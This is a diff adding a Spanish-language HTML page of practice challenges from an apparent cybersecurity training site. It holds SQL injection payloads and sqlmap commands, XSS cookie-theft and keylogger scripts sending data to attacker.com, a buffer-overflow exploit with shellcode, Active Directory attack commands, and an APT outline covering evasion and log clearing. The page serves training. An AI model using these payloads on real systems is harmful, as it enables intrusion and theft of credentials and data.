@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retos - CDPN</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="app.html" class="nav-logo"><i class="fas fa-shield-halved"></i> CDPN</a>
+            <ul class="nav-menu">
+                <li><a href="app.html"><i class="fas fa-home"></i> Inicio</a></li>
+                <li class="nav-dropdown">
+                    <a href="app.html#modulos"><i class="fas fa-layer-group"></i> Módulos <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="app.html#mod-00"><span class="dot intro"></span> Introducción</a></li>
+                        <li><a href="app.html#mod-01"><span class="dot red"></span> Ciberseguridad Ofensiva</a></li>
+                        <li><a href="app.html#mod-02"><span class="dot blue"></span> Seguridad de la Información</a></li>
+                        <li><a href="app.html#mod-03ai"><span class="dot ai"></span> AI Agents & Tools</a></li>
+                        <li><a href="app.html#mod-03bt"><span class="dot blue"></span> Blue Team / Defensa</a></li>
+                        <li><a href="app.html#mod-04pt"><span class="dot purple"></span> Purple Team</a></li>
+                        <li><a href="app.html#mod-04labs"><span class="dot lab"></span> Laboratorios</a></li>
+                    </ul>
+                </li>
+                <li><a href="retos.html" class="active"><i class="fas fa-trophy"></i> Retos</a></li>
+                <li><a href="herramientas.html"><i class="fas fa-tools"></i> Herramientas</a></li>
+                <li><a href="labs.html"><i class="fas fa-flask"></i> Labs</a></li>
+                <li><a href="recursos.html"><i class="fas fa-book"></i> Recursos</a></li>
+            </ul>
+            <div class="nav-actions">
+                <button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i></button>
+                <a href="https://github.com/0xvanguard/CyberDefense-Pro-Network" class="nav-github" target="_blank"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- PAGE HERO -->
+    <section class="page-hero">
+        <div class="page-hero-content">
+            <span class="page-badge"><i class="fas fa-trophy"></i> DESAFÍOS PRÁCTICOS</span>
+            <h1>Retos de <span class="gradient-text">Ciberdefensa</span></h1>
+            <p>Pon a prueba tus habilidades con retos reales organizados por dificultad. Cada reto incluye guía paso a paso, herramientas y soluciones.</p>
+            <div class="hero-stats">
+                <div class="stat"><span class="stat-number">15+</span><span class="stat-label">Retos</span></div>
+                <div class="stat"><span class="stat-number">3</span><span class="stat-label">Niveles</span></div>
+                <div class="stat"><span class="stat-number">7</span><span class="stat-label">Categorías</span></div>
+            </div>
+        </div>
+    </section>
+
+    <main class="main-content">
+
+        <!-- FILTROS -->
+        <section class="filter-section">
+            <div class="filter-bar">
+                <button class="filter-btn active" data-filter="all">Todos</button>
+                <button class="filter-btn" data-filter="easy"><span class="diff-dot easy"></span> Fácil</button>
+                <button class="filter-btn" data-filter="medium"><span class="diff-dot medium"></span> Medio</button>
+                <button class="filter-btn" data-filter="hard"><span class="diff-dot hard"></span> Difícil</button>
+            </div>
+        </section>
+
+        <!-- RETOS FÁCILES -->
+        <section class="challenges-section">
+            <h2><span class="diff-badge easy"><i class="fas fa-signal"></i> Nivel Fácil</span> Retos para Principiantes</h2>
+            <p class="section-desc">Empieza aquí. Estos retos te enseñan los fundamentos con ejercicios guiados.</p>
+
+            <div class="challenges-grid">
+                <!-- Reto 1: SQL Injection -->
+                <div class="challenge-card easy" data-difficulty="easy">
+                    <div class="challenge-header">
+                        <span class="challenge-num">01</span>
+                        <span class="challenge-diff easy"><i class="fas fa-circle"></i> Fácil</span>
+                    </div>
+                    <h3><i class="fas fa-database"></i> SQL Injection Básico</h3>
+                    <p>Encuentra y explota una vulnerabilidad de inyección SQL en una aplicación web vulnerable.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 2 horas</span>
+                        <span><i class="fas fa-tag"></i> Web</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Identificar el formulario:</strong> Busca campos de entrada (login, búsqueda, formulario de contacto).</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Probar payload básico:</strong> Ingresa <code>' OR '1'='1</code> en el campo de usuario.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Determinar columnas:</strong> Usa <code>' ORDER BY 1--</code>, incrementa hasta que falle.</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Extraer datos:</strong> <code>' UNION SELECT username,password FROM users--</code></div></div>
+                            <div class="guide-step"><span class="guide-num">5</span><div><strong>Automatizar:</strong> <code>sqlmap -u "http://target.com/page?id=1" --dbs --batch</code></div></div>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">SQL Payloads</span></div>
+                        <pre><code># Bypass de login
+admin' --
+' OR 1=1--
+admin'/*
+
+# UNION-based injection
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+
+# Con SQLMap
+sqlmap -u "http://target.com/page?id=1" --dbs --batch
+sqlmap -u "http://target.com/page?id=1" -D testdb --tables</code></pre>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-code"></i> SQLMap</span>
+                        <span class="tool-tag"><i class="fas fa-spider"></i> Burp Suite</span>
+                        <span class="tool-tag"><i class="fas fa-globe"></i> Navegador</span>
+                    </div>
+                </div>
+
+                <!-- Reto 2: XSS -->
+                <div class="challenge-card easy" data-difficulty="easy">
+                    <div class="challenge-header">
+                        <span class="challenge-num">02</span>
+                        <span class="challenge-diff easy"><i class="fas fa-circle"></i> Fácil</span>
+                    </div>
+                    <h3><i class="fas fa-code"></i> Cross-Site Scripting (XSS)</h3>
+                    <p>Inyecta scripts maliciosos en una aplicación web para robar cookies o ejecutar acciones.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 1.5 horas</span>
+                        <span><i class="fas fa-tag"></i> Web</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Buscar campos reflejados:</strong> Escribe <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> en cada campo.</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Bypass de filtros:</strong> Prueba <code>&lt;img src=x onerror=alert(1)&gt;</code></div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Steal cookies:</strong> <code>&lt;script&gt;new Image().src="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</code></div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Reflected vs Stored:</strong> Identifica si el XSS se almacena o solo se refleja.</div></div>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">XSS Payloads</span></div>
+                        <pre><code># Reflected XSS básico
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# XSS con img tag
+&lt;img src=x onerror="alert('XSS')"&gt;
+
+# Robo de cookies
+&lt;script&gt;
+fetch('http://attacker.com/steal?cookie='+document.cookie)
+&lt;/script&gt;
+
+# Keylogger sencillo
+&lt;script&gt;
+document.onkeypress=function(e){
+  fetch('http://attacker.com/log?key='+e.key)
+}
+&lt;/script&gt;</code></pre>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-spider"></i> Burp Suite</span>
+                        <span class="tool-tag"><i class="fas fa-globe"></i> Navegador</span>
+                        <span class="tool-tag"><i class="fas fa-server"></i> Burp Collaborator</span>
+                    </div>
+                </div>
+
+                <!-- Reto 3: Nmap Scan -->
+                <div class="challenge-card easy" data-difficulty="easy">
+                    <div class="challenge-header">
+                        <span class="challenge-num">03</span>
+                        <span class="challenge-diff easy"><i class="fas fa-circle"></i> Fácil</span>
+                    </div>
+                    <h3><i class="fas fa-network-wired"></i> Escaneo de Red con Nmap</h3>
+                    <p>Aprende a descubrir hosts, puertos abiertos y servicios en una red.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 1 hora</span>
+                        <span><i class="fas fa-tag"></i> Red</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Descubrimiento de hosts:</strong> <code>nmap -sn 192.168.1.0/24</code></div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Escaneo de puertos:</strong> <code>nmap -sV -sC target_ip</code></div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Detectar SO:</strong> <code>nmap -O target_ip</code></div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Scriptos NSE:</strong> <code>nmap --script=vuln target_ip</code></div></div>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Nmap Commands</span></div>
+                        <pre><code># Escaneo rápido de la red local
+nmap -sn 192.168.1.0/24
+
+# Escaneo completo de puertos con versiones
+nmap -sV -sC -O -p- target_ip
+
+# Escaneo stealth (SYN)
+nmap -sS -T2 target_ip
+
+# Scripts de vulnerabilidad
+nmap --script=vuln,exploit -p 80,443 target_ip
+
+# Output a archivo
+nmap -oA result target_ip</code></pre>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-network-wired"></i> Nmap</span>
+                        <span class="tool-tag"><i class="fas fa-terminal"></i> Terminal</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- RETOS MEDIOS -->
+        <section class="challenges-section">
+            <h2><span class="diff-badge medium"><i class="fas fa-signal"></i> Nivel Medio</span> Retos Intermedios</h2>
+            <p class="section-desc">Para quienes ya dominan lo básico. Retos que requieren pensamiento crítico.</p>
+
+            <div class="challenges-grid">
+                <!-- Reto 4: Buffer Overflow -->
+                <div class="challenge-card medium" data-difficulty="medium">
+                    <div class="challenge-header">
+                        <span class="challenge-num">04</span>
+                        <span class="challenge-diff medium"><i class="fas fa-circle"></i> Medio</span>
+                    </div>
+                    <h3><i class="fas fa-bomb"></i> Buffer Overflow Local</h3>
+                    <p>Explota un desbordamiento de búfer para obtener ejecución de código en una aplicación vulnerable.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 3 horas</span>
+                        <span><i class="fas fa-tag"></i> Binary</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Fuzzing:</strong> Envía strings incrementales para encontrar el offset exacto del crash.</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Controlar EIP:</strong> Usa pattern_create y pattern_offset de Metasploit.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Bad chars:</strong> Identifica caracteres que rompen el payload.</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Shellcode:</strong> Inyecta shellcode reverso o usa jmp esp.</div></div>
+                            <div class="guide-step"><span class="guide-num">5</span><div><strong>Exploit:</strong> Construye el payload final con la estructura correcta.</div></div>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Python Exploit</span></div>
+                        <pre><code>#!/usr/bin/env python3
+import struct
+
+offset = 1978  # Offset a EIP
+
+# Shellcode reverso (msfvenom)
+shellcode = (
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+
+# Construir payload
+payload = b"A" * offset
+payload += struct.pack("&lt;I", 0x7c9d30d7)  # JMP ESP (ntdll.dll)
+payload += shellcode
+
+with open("payload.txt", "wb") as f:
+    f.write(payload)
+
+print(f"Payload enviado: {len(payload)} bytes")</code></pre>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-bug"></i> GDB</span>
+                        <span class="tool-tag"><i class="fas fa-explosion"></i> Metasploit</span>
+                        <span class="tool-tag"><i class="fas fa-code"></i> Python</span>
+                        <span class="tool-tag"><i class="fas fa-search"></i> Ghidra</span>
+                    </div>
+                </div>
+
+                <!-- Reto 5: Active Directory -->
+                <div class="challenge-card medium" data-difficulty="medium">
+                    <div class="challenge-header">
+                        <span class="challenge-num">05</span>
+                        <span class="challenge-diff medium"><i class="fas fa-circle"></i> Medio</span>
+                    </div>
+                    <h3><i class="fas fa-building"></i> Pentesting Active Directory</h3>
+                    <p>Explora un entorno AD completo: enumeración, movimiento lateral y escalada de dominio.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 4 horas</span>
+                        <span><i class="fas fa-tag"></i> AD</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Enumeración:</strong> <code>enum4linux -a DC_IP</code>, <code>ldapsearch</code></div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>User Enumeration:</strong> <code>crackmapexec ldap DC_IP -u user -p pass --users</code></div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>AS-REP Roasting:</strong> <code>GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat</code></div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Kerberoasting:</strong> <code>GetUserSPNs.py DOMAIN/user:pass -request</code></div></div>
+                            <div class="guide-step"><span class="guide-num">5</span><div><strong>Pass-the-Hash:</strong> <code>crackmapexec smb DC_IP -u admin -H NTLM_HASH</code></div></div>
+                        </div>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-building"></i> BloodHound</span>
+                        <span class="tool-tag"><i class="fas fa-key"></i> Rubeus</span>
+                        <span class="tool-tag"><i class="fas fa-terminal"></i> Impacket</span>
+                        <span class="tool-tag"><i class="fas fa-network-wired"></i> CrackMapExec</span>
+                    </div>
+                </div>
+
+                <!-- Reto 6: Malware Analysis -->
+                <div class="challenge-card medium" data-difficulty="medium">
+                    <div class="challenge-header">
+                        <span class="challenge-num">06</span>
+                        <span class="challenge-diff medium"><i class="fas fa-circle"></i> Medio</span>
+                    </div>
+                    <h3><i class="fas fa-virus"></i> Análisis de Malware</h3>
+                    <p>Analiza una muestra de malware usando técnicas estáticas y dinámicas para entender su comportamiento.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 3 horas</span>
+                        <span><i class="fas fa-tag"></i> Malware</span>
+                        <span><i class="fas fa-shield-alt"></i> Blue Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Entorno seguro:</strong> Configura una VM aislada (sin internet).</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Análisis estático:</strong> <code>file</code>, <code>strings</code>, <code>xxd</code>, PE-bear.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Hashing:</strong> <code>sha256sum malware.exe</code> → busca en VirusTotal.</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Análisis dinámico:</strong> Ejecutar en sandbox, monitorear conexiones de red.</div></div>
+                            <div class="guide-step"><span class="guide-num">5</span><div><strong>Reglas YARA:</strong> Crear reglas para detectar patrones similares.</div></div>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Análisis Estático</span></div>
+                        <pre><code># Identificar el archivo
+file malware.exe
+
+# Buscar strings interesantes
+strings -n 6 malware.exe | grep -i "http\|password\|key\|api"
+
+# Ver hash
+sha256sum malware.exe
+
+# Regla YARA básica
+rule Malware_Ejemplo {
+    strings:
+        $s1 = "http://c2server.com"
+        $s2 = "cmd.exe /c"
+    condition:
+        2 of them
+}</code></pre>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fas fa-virus"></i> YARA</span>
+                        <span class="tool-tag"><i class="fas fa-search"></i> Ghidra</span>
+                        <span class="tool-tag"><i class="fas fa-eye"></i> Wireshark</span>
+                        <span class="tool-tag"><i class="fas fa-desktop"></i> REMnux</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- RETOS DIFÍCILES -->
+        <section class="challenges-section">
+            <h2><span class="diff-badge hard"><i class="fas fa-signal"></i> Nivel Difícil</span> Retos Avanzados</h2>
+            <p class="section-desc">Para profesionales. Retos complejos que simulan escenarios reales de ataque.</p>
+
+            <div class="challenges-grid">
+                <!-- Reto 7: Full Pentest -->
+                <div class="challenge-card hard" data-difficulty="hard">
+                    <div class="challenge-header">
+                        <span class="challenge-num">07</span>
+                        <span class="challenge-diff hard"><i class="fas fa-circle"></i> Difícil</span>
+                    </div>
+                    <h3><i class="fas fa-user-secret"></i> Pentest Completo — Full Engagement</h3>
+                    <p>Simula un pentest completo: desde reconocimiento hasta reporte ejecutivo.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 8+ horas</span>
+                        <span><i class="fas fa-tag"></i> Pentest</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso (PTES)</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Pre-engagement:</strong> Define alcance, reglas de juego, point of contact.</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Reconocimiento:</strong> OSINT, DNS, WHOIS, Shodan, LinkedIn.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Enumeración:</strong> Nmap, Gobuster, Nikto, Wapiti.</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Vulnerability Analysis:</strong> Nessus, Nuclei, manual testing.</div></div>
+                            <div class="guide-step"><span class="guide-num">5</span><div><strong>Explotación:</strong> Metasploit, Burp, custom exploits.</div></div>
+                            <div class="guide-step"><span class="guide-num">6</span><div><strong>Post-Exploitation:</strong> Privesc, lateral movement, data exfil.</div></div>
+                            <div class="guide-step"><span class="guide-num">7</span><div><strong>Reporte:</strong> Executive summary, findings, recommendations.</div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Reto 8: K8s Escape -->
+                <div class="challenge-card hard" data-difficulty="hard">
+                    <div class="challenge-header">
+                        <span class="challenge-num">08</span>
+                        <span class="challenge-diff hard"><i class="fas fa-circle"></i> Difícil</span>
+                    </div>
+                    <h3><i class="fab fa-docker"></i> Kubernetes Cluster Escape</h3>
+                    <p>Escapa de un pod Kubernetes y escala privilegios hasta el nodo.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 5 horas</span>
+                        <span><i class="fas fa-tag"></i> Cloud</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Enumeración del pod:</strong> Variables de entorno, service account tokens.</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>API del cluster:</strong> <code>curl -k https://kubernetes.default.svc</code></div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Permisos SA:</strong> ¿Qué puede hacer el service account?</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Escape:</strong> Montar host filesystem o crear pod privilegiado.</div></div>
+                        </div>
+                    </div>
+                    <div class="tools-used">
+                        <span class="tool-tag"><i class="fab fa-docker"></i> kubectl</span>
+                        <span class="tool-tag"><i class="fas fa-terminal"></i> curl</span>
+                        <span class="tool-tag"><i class="fas fa-cloud"></i> Kubernetes</span>
+                    </div>
+                </div>
+
+                <!-- Reto 9: APT Simulation -->
+                <div class="challenge-card hard" data-difficulty="hard">
+                    <div class="challenge-header">
+                        <span class="challenge-num">09</span>
+                        <span class="challenge-diff hard"><i class="fas fa-circle"></i> Difícil</span>
+                    </div>
+                    <h3><i class="fas fa-user-ninja"></i> Simulación APT (Advanced Persistent Threat)</h3>
+                    <p>Ejecuta una simulación completa de APT: persistencia, evasión, exfiltración y cobertura de rastros.</p>
+                    <div class="challenge-meta">
+                        <span><i class="fas fa-clock"></i> 10+ horas</span>
+                        <span><i class="fas fa-tag"></i> APT</span>
+                        <span><i class="fas fa-crosshairs"></i> Red Team</span>
+                    </div>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Guía Paso a Paso (MITRE ATT&CK)</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Initial Access (TA0001):</strong> Phishing, exploiting public apps.</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Execution (TA0002):</strong> PowerShell, WMI, scheduled tasks.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Persistence (TA0003):</strong> Registry keys, services, DLL hijacking.</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Defense Evasion (TA0005):</strong> AMSI bypass, unhooking, process injection.</div></div>
+                            <div class="guide-step"><span class="guide-num">5</span><div><strong>Lateral Movement (TA0008):</strong> Pass-the-Hash, RDP, PsExec.</div></div>
+                            <div class="guide-step"><span class="guide-num">6</span><div><strong>Exfiltration (TA0010):</strong> DNS tunneling, ICMP, cloud storage.</div></div>
+                            <div class="guide-step"><span class="guide-num">7</span><div><strong>Cover Tracks (TA0007):</strong> Clear logs, timestomp, secure delete.</div></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- RETOS PURPLE TEAM -->
+        <section class="challenges-section">
+            <h2><span class="diff-badge purple"><i class="fas fa-users"></i> Purple Team</span> Retos Colaborativos</h2>
+            <p class="section-desc">Retos que combinan ofensiva y defensiva. Ataca y detecta al mismo tiempo.</p>
+
+            <div class="challenges-grid">
+                <div class="challenge-card medium" data-difficulty="medium">
+                    <div class="challenge-header">
+                        <span class="challenge-num">PT-01</span>
+                        <span class="challenge-diff medium"><i class="fas fa-circle"></i> Medio</span>
+                    </div>
+                    <h3><i class="fas fa-desktop"></i> Login Storm Controlado</h3>
+                    <p>Simula intentos de login fallidos y detecta si el SOC los ve en tiempo real.</p>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Proceso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Offensivo:</strong> Ejecuta 50+ intentos de login fallidos contra el dominio.</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Defensivo:</strong> Revisa logs de autenticación en Wazuh/ELK.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Análisis:</strong> ¿Se generó alerta? ¿Cuánto tiempo tardó?</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Mejora:</strong> Crea regla Sigma para detectar este patrón.</div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="challenge-card medium" data-difficulty="medium">
+                    <div class="challenge-header">
+                        <span class="challenge-num">PT-02</span>
+                        <span class="challenge-diff medium"><i class="fas fa-circle"></i> Medio</span>
+                    </div>
+                    <h3><i class="fas fa-route"></i> Rutas "Raras" en Web</h3>
+                    <p>Explora rutas ocultas en una web y verifica si el WAF/SIEM las detecta.</p>
+                    <div class="challenge-guide">
+                        <h4><i class="fas fa-list-ol"></i> Proceso</h4>
+                        <div class="step-guide">
+                            <div class="guide-step"><span class="guide-num">1</span><div><strong>Offensivo:</strong> Usa Gobuster/ffuf para fuzzear rutas (/admin, /backup, /test).</div></div>
+                            <div class="guide-step"><span class="guide-num">2</span><div><strong>Defensivo:</strong> Analiza logs de acceso web en ELK.</div></div>
+                            <div class="guide-step"><span class="guide-num">3</span><div><strong>Análisis:</strong> Identifica códigos HTTP anómalos (403, 500).</div></div>
+                            <div class="guide-step"><span class="guide-num">4</span><div><strong>Mejora:</strong> Crea playbooks de hunting para rutas sospechosas.</div></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <h4><i class="fas fa-shield-halved"></i> CDPN</h4>
+                    <p>Formando profesionales de ciberdefensa en todo el mundo.</p>
+                </div>
+                <div class="footer-col">
+                    <h4>Plataforma</h4>
+                    <ul>
+                        <li><a href="app.html#mod-00">Introducción</a></li>
+                        <li><a href="app.html#mod-01">Ciberseguridad Ofensiva</a></li>
+                        <li><a href="app.html#mod-03bt">Blue Team</a></li>
+                        <li><a href="app.html#mod-04pt">Purple Team</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Secciones</h4>
+                    <ul>
+                        <li><a href="retos.html">Retos</a></li>
+                        <li><a href="herramientas.html">Herramientas</a></li>
+                        <li><a href="labs.html">Labs</a></li>
+                        <li><a href="recursos.html">Recursos</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Comunidad</h4>
+                    <ul>
+                        <li><a href="https://github.com/0xvanguard/CyberDefense-Pro-Network" target="_blank"><i class="fab fa-github"></i> GitHub</a></li>
+                        <li><a href="#"><i class="fab fa-discord"></i> Discord</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 CyberDefense Pro Network. Todos los derechos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+    <script>
+    // Filter challenges
+    document.querySelectorAll('.filter-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            const filter = btn.dataset.filter;
+            document.querySelectorAll('.challenge-card').forEach(card => {
+                if (filter === 'all' || card.dataset.difficulty === filter) {
+                    card.style.display = '';
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+        });
+    });
+    </script>
+</body>
+</html>
